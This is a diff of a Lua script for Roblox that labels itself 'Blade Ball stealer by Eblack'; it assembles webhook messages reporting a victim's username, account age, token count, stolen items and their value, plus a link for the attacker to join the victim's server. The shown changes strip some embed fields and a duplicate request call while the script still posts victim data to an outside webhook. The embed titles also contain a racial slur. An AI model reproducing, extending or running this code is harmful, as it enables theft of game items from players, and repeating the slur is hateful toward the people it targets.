@@ -209,45 +209,15 @@ local function SendJoinMessage(list, prefix)
         end
     end
 
-  -- REMPLACE TOUTE LA PARTIE DES EMBEDS PAR CECI :
-
-    -- Calcul des tokens juste avant l'envoi
-    local tokensEmbed = "0"
-    pcall(function()
-        tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
-    end)
-
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["auth_token"] = auth_token, 
-        ["embeds"] = {{
-            ["title"] = "🟡 Pending Hit ... | ⚔️ Blade Ball Stealer",
-            ["color"] = 16763904,
-            ["fields"] = {
-                {
-                    ["name"] = "ℹ️ Player info:",
-                    ["value"] = "```" ..
-                        "\n🆔 Username      : " .. plr.Name ..
-                        "\n👤 Display Name  : " .. plr.DisplayName ..
-                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
-                        "\n⚡ Executor      : " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
-                        "\n🪙 Tokens        : " .. formatNumber(tonumber(tokensEmbed)) ..
-                        "```",
-                    ["inline"] = false
-                },
-                fields[3], -- Ta liste d'items originale (Item List)
-                fields[4], -- Ton résumé original (Summary RAP)
-                {
-                    ["name"] = "🔗 Quick Links", 
-                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**VIEW INVENTORY**](https://www.roblox.com/users/"..plr.UserId.."/inventory)", 
-                    ["inline"] = false
-                }
-            },
+		["embeds"] = {{
+            ["title"] = "🟣 Bro join your hit nigga 🎯",
+            ["color"] = 8323327,
+            ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack • " .. os.date("%X")
-            },
-            ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+                ["text"] = "Blade Ball stealer by Eblack"
             }
         }}
     }
@@ -265,22 +235,22 @@ end
 
 local function SendMessage(list)
     local fields = {
-        {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Items sent 📝:",
-            value = "",
-            inline = false
-        },
+		{
+			name = "Victim Username 🤖:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items sent 📝:",
+			value = "",
+			inline = false
+		},
         {
             name = "Summary 💰:",
             value = string.format("Total RAP: %s", formatNumber(totalRAP)),
             inline = false
         }
-    }
+	}
 
     local grouped = {}
     for _, item in ipairs(list) do
@@ -326,20 +296,12 @@ local function SendMessage(list)
         ["embeds"] = {{
             ["title"] = "🟣 The nigga is on the server 🎉" ,
             ["color"] = 8323327,
-            ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack"
-            }
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Blade Ball stealer by Eblack"
+			}
         }}
     }
-    -- Ajout du request manquant pour le deuxième message
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end
 
     local body = HttpService:JSONEncode(data)
     local headers = {
